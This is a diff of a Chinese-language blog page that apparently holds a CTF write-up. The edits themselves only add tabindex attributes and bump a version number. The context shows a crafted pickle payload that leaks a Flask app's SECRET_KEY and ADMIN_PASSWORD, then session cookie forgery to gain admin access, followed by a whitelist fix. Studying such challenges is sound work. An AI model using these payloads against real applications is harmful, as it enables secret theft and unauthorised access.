@@ -103,7 +103,7 @@
 <p>扫目录发现 <code>/backup</code> 打开发现源码泄露</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre class="chroma" tabindex="0"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -169,7 +169,7 @@
 </span><span class="lnt">64
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">url_for</span>
+<pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">url_for</span>
 <span class="kn">import</span> <span class="nn">pickle</span>
 <span class="kn">import</span> <span class="nn">io</span>
 <span class="kn">import</span> <span class="nn">sys</span>
@@ -245,7 +245,7 @@
 <p>首先写一个测试用的 <code>User</code> 类</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre class="chroma" tabindex="0"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -257,7 +257,7 @@
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># settings.py</span>
+<pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="c1"># settings.py</span>
 <span class="k">class</span> <span class="nc">User</span><span class="p">:</span>
     <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
         <span class="bp">self</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="s2">"password"</span>
@@ -272,10 +272,10 @@
 </div><p>并得到反序列化数据</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">\x80\x04\x952\x00\x00\x00\x00\x00\x00\x00\x8c\x08settings\x94\x8c\x04User\x94\x93\x94)\x81\x94}\x94(\x8c\x08password\x94h\x05\x8c\x03msg\x94h\x06ub.
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">\x80\x04\x952\x00\x00\x00\x00\x00\x00\x00\x8c\x08settings\x94\x8c\x04User\x94\x93\x94)\x81\x94}\x94(\x8c\x08password\x94h\x05\x8c\x03msg\x94h\x06ub.
 </code></pre></td></tr></table>
 </div>
 </div><p>对其进行简单分析</p>
@@ -305,10 +305,10 @@
 <p>最终得到非常 V4 的序列化数据如下</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">\x80\x04\x952\x00\x00\x00\x00\x00\x00\x00\x8c\x08settings\x94\x8c\x04User\x94\x93\x94)\x81\x94}\x94(\x8c\x08password\x94\x8c\x08settings\x94\x8c\x0eADMIN_PASSWORD\x94\x93\x94\x8c\x03msg\x94\x8c\x08settings\x94\x8c\nSECRET_KEY\x94\x93\x94ub.
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">\x80\x04\x952\x00\x00\x00\x00\x00\x00\x00\x8c\x08settings\x94\x8c\x04User\x94\x93\x94)\x81\x94}\x94(\x8c\x08password\x94\x8c\x08settings\x94\x8c\x0eADMIN_PASSWORD\x94\x93\x94\x8c\x03msg\x94\x8c\x08settings\x94\x8c\nSECRET_KEY\x94\x93\x94ub.
 </code></pre></td></tr></table>
 </div>
 </div><p>base64 encode 一下传进去就可以拿到 SECRET_KEY 了</p>
@@ -316,19 +316,19 @@
 <p>这一步就非常简单了，用这个库 <a href="https://github.com/noraj/flask-session-cookie-manager" rel="noopener noreffer" target="_blank">Flask Session Cookie Decoder/Encoder</a> 解一下 Cookie 中的 session 得到</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">{"logged_in":0,"name":"Anonymous"}
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">{"logged_in":0,"name":"Anonymous"}
 </code></pre></td></tr></table>
 </div>
 </div><p>修改成如下数据然后再用上述库和上一步得到的 SECRET_KEY 得到新的 session 值</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">{"logged_in":1,"name":"admin"}
+<pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback">{"logged_in":1,"name":"admin"}
 </code></pre></td></tr></table>
 </div>
 </div><p>替换掉 Cookie 中的 session 访问 <code>/index</code> 即可得到 flag</p>
@@ -337,10 +337,10 @@
 <p>源码的第 19~20 行是对反序列化进行限制的主要部分，限制了 <code>module</code> 和 <code>name</code>，只需要在 if 里加一个条件过滤掉 <code>SECRET_KEY</code> 和 <code>ADMIN_PASSWORD</code> 即可，即将第 19 行改为如下代码</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre class="chroma" tabindex="0"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="k">if</span> <span class="n">module</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">'settings'</span><span class="p">]</span> <span class="ow">and</span> <span class="s2">"__"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">name</span> <span class="ow">and</span> <span class="n">name</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">'SECRET_KEY'</span><span class="p">,</span> <span class="s1">'ADMIN_PASSWORD'</span><span class="p">]:</span>
+<pre class="chroma" tabindex="0"><code class="language-python" data-lang="python"><span class="k">if</span> <span class="n">module</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">'settings'</span><span class="p">]</span> <span class="ow">and</span> <span class="s2">"__"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">name</span> <span class="ow">and</span> <span class="n">name</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">'SECRET_KEY'</span><span class="p">,</span> <span class="s1">'ADMIN_PASSWORD'</span><span class="p">]:</span>
 </code></pre></td></tr></table>
 </div>
 </div><h2 id="0x03-后记">0x03 后记</h2>
@@ -377,7 +377,7 @@
                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
             </noscript></div></article></div>
 </main><footer class="footer">
-<div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" rel="noopener noreffer" target="_blank" title="Hugo 0.85.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" rel="noopener noreffer" target="_blank" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+<div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" rel="noopener noreffer" target="_blank" title="Hugo 0.87.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" rel="noopener noreffer" target="_blank" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
 </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder"> <a href="/" target="_blank">X5tar</a></span> | <span class="license"><a href="https://creativecommons.org/licenses/by-sa/4.0/" rel="license external nofollow noopener noreffer" target="_blank">CC BY-SA 4.0</a></span></div>
 </div>
 </footer></div>
